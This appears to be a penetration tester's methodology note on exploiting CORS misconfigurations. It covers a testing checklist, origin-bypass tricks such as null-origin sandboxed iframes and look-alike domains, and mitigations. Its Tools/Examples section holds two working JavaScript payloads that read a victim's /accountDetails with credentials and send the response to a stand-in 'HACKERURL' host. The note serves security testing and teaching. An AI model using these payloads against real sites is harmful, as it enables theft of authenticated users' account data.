---
title: "CORS"
layout: notes
tags:
  - webapp
  - methodology
  - cors
  - FI_http-headers
  - Co_ssrf
  - Co_authorization-bypass
---
## Summary

CORS is defined when a header is set to allow various external domains access to resources on a given domain, as an addition to the same-origin-policy (SOP). The response header after a request will hold two relevant headers that state if the origin defined is allowed `Access-Control-Allow-Origin` and the request should include credentials `Access-Control-Allow-Credentials`, otherwise known as cookies, certificates, or auth headers. CORS is not a substitute for server-side protections and can potentially be leveraged to access internal resources if set to allow `null` or `*`. 

## Methodology

When looking for CORS vulnerabilities ask/try the following:
- [ ] **What other subdomains or domains need to access this resource?**
- [ ] **Where in this application is sensitive information given?**
- [ ] can you send an OPTIONS request to find allowed origins
- [ ] try `Origin: null`
	- [ ] `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="JAVASCRIPT"></iframe>`
- [ ] try host header esque attacks to bypass domain restrictions
	- [ ] `expected.domain.evil.pwn` `evilexpected.domain`
- [ ] do you have XSS on a related domain
	- [ ] might need to urlencode some characters like + and < 
- [ ] try to downgrade to http and intercept request with mitm
- [ ] try to access an intranet resource

## Capabilities

SSRF  
Authorization Bypass  

## Found In

HTTP Headers  

## Tools/Examples

javascript to grab info if cors is allowed
```
#if null#<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
    var xhr = new XMLHttpRequest();
    var url = 'SITEURL'
   
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE){
            fetch('HACKERURL/log?key=' + xhr.responseText)
        }
    }

    xhr.open('GET', url + '/accountDetails', true);
    xhr.withCredentials = true
    xhr.send(null)
</script>
"></iframe> #if null#
```

try this too, helpful for XSS
```
<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='HACKERURL/log?key='%2bthis.responseText; };%3c/script>
```

#### Mitigation

Origins with sensitive information should be specified in the ACAO  
Origins specified in `Access-Control-Allow-Origin` should be trusted  
Avoid using `Access-Control-Allow-Origin: null`  
Avoid * in internal networks  
CORS isn't a substitute for server security policies  










